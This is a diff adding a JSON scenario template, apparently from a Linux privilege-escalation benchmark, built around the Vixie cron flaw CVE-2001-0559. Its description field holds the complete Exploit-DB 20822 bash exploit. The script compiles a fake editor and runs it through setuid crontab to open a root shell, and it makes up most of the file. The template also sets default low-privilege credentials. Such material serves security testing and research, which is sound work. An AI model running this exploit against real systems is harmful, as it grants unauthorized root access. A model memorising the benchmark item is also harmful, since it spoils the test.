@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_20822",
+  "category": "C1_cron",
+  "attack_technique": "T1053.003",
+  "cwe": "CWE-732",
+  "description": "Linux privilege escalation: Vixie Cron crontab 3.0 - Privilege Lowering Failure (1) (CVE-2001-0559;OSVDB-1813)\n\nExploit source code (20822.sh):\n```\nsource: https://www.securityfocus.com/bid/2687/info\n\nVixie cron is an implementation of the popular UNIX program that runs user-specified programs at periodic scheduled times.\n\nWhen a parsing error occurs after a modification operation, crontab will fail to drop privileges correctly for subsequent modification operations.\n\nThis vulnerability may be exploited to gain root privileges locally.\n\n#!/bin/bash\n\nclear\necho \".-----------------------------------------------------------.\"\necho \"| Marchew.Hyperreal presents: vixie crontab exploit #728371 |\"\necho \"|===========================================================|\"\necho \"| Sebastian Krahmer <krahmer@security.is>                   |\"\necho \"| Michal Zalewski <lcamtuf@coredump.cx>                     |\"\necho \"\\`-----------------------------------------------------------'\"\necho\n\ntest \"$CRONBIN\" = \"\" && CRONBIN=/usr/bin/crontab\n\necho    \">>> Using binary:  $CRONBIN\"\necho -n \">>> Setuid check:  \"\n\nif [ -u $CRONBIN ]; then\n  echo \"PASSED\"\nelse\n  echo \"FAILED\"\n  echo\n  exit 1\nfi\n\necho -n \">>> Version check: \"\n\nQQ=`strings $CRONBIN | grep '43 vixie Exp'`\n\nif [ \"$QQ\" = \"\" ]; then\n  echo \"FAILED\"\n  echo\n  exit 1\nelse\n  echo \"PASSED\"\nfi\n\necho \">>> Building exploit...\"\n\ncat >edit0r.c <<_eof_\n#include <stdio.h>\nint main(int argc,char* argv[]) {\n  sleep(1);\n  if (geteuid()) {\n    FILE* x=fopen(argv[1],\"w\");\n    fprintf(x,\"blah blah blah\\n\");\n    fclose(x);\n  } else {\n    dup2(1,0);\n    dup2(1,2);\n    printf(\"\\n>>> Entering rootshell, babe...\\n\");\n    system(\"touch $HOME/.xploited\");\n    system(\"bash\");\n  }\n}\n_eof_\n\ngcc edit0r.c -o edit0r &>/dev/null\nrm -f edit0r.c\n\nif [ ! -f edit0r ]; then\n  echo \">>> Cannot compile exploit.\"\n  echo\n  exit 1\nfi\n\nrm -f ~/.xploited\n\necho \">>> Performing attack...\"\n\n( echo \"y\"; echo \"n\" ) | VISUAL=$PWD/edit0r $CRONBIN -e 2>/dev/null\n\nrm -f edit0r\n\nif [ -f ~/.xploited ]; then\n  echo\n  echo \">>> Thank you.\"\n  rm -f ~/.xploited\n  echo\n  exit 0\nelse\n  echo\n  echo \">>> Apparently I am not able to exploit it, sorry...\"\n  echo\n  exit 1\nfi\n```",
+  "cve": "CVE-2001-0559;OSVDB-1813",
+  "exploitdb_id": "20822",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_20822",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
